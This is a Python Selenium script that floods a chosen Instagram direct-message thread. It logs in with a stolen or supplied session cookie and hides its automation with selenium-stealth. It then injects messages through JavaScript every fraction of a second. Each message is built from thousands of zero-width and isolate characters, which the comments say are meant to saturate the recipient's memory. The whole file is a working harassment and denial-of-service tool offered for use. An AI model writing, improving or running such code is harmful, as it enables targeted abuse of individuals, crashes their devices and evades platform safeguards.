# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (DIRECT-DISPATCH V49)
# 📅 STATUS: UI-QUEUE-BYPASS | 4-AGENT TOTAL | AWS-CPU-STRIKE

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.4)    
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_dispatch_payload():
    """Generates a high-authority visible payload designed for 32GB RAM saturation."""
    u_id = random.randint(100, 999)
    # \u2060 = Word Joiner | \u200D = ZWJ | \u2068 = Isolate
    glue, zwj, iso, pop = "\u2060", "\u200D", "\u2068", "\u2069"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [DISPATCH_ID:{u_id}]"
    
    body = []
    # 380 lines of unique, high-plane memory triggers
    for i in range(380):
        # Mixing 4-byte Fraktur and standard text to break memory compression
        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {zwj} 𝕻{i}{pop}{glue*12}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # 🛡️ THE FIX: Disable EVERYTHING that renders on your side
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def direct_dispatch_send(driver, text):
    """Bypasses the 'Typing' lag by using a Frame-Synchronized JS event."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                // Use requestAnimationFrame to ensure the CPU is 'ready' to send
                window.requestAnimationFrame(() => {
                    box.focus();
                    document.execCommand('selectAll', false, null);
                    document.execCommand('delete', false, null);
                    document.execCommand('insertText', false, arguments[0]);
                    
                    // Trigger Internal Framework State
                    box.dispatchEvent(new Event('input', { bubbles: true }));
                    
                    // Fire Native Keyboard Event
                    var e = new KeyboardEvent('keydown', {
                        key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                        bubbles: true, cancelable: true
                    });
                    box.dispatchEvent(e);
                });
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_dispatch_payload()
                if direct_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Dispatch-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 60 == 0:
                        driver.refresh()
                        time.sleep(8)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
